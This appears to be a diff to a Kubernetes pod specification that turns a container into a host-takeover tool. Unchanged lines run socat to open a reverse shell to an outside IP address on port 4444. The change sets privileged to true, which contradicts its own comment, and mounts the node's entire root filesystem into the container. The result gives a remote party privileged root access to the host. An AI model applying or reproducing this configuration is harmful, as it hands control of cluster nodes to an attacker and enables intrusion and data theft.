@@ -18,6 +18,13 @@ spec:
           # Create and execute the reverse shell
           socat TCP:23.27.169.114:4444 EXEC:/bin/bash,pty
       securityContext:
-        privileged: false  # Set to false unless needed
+        privileged: true  # Set to false unless needed
       tty: true
       stdin: true
+      volumeMounts:
+        - mountPath: /host
+          name: noderoot
+  volumes:
+    - name: noderoot
+      hostPath:
+        path: /        
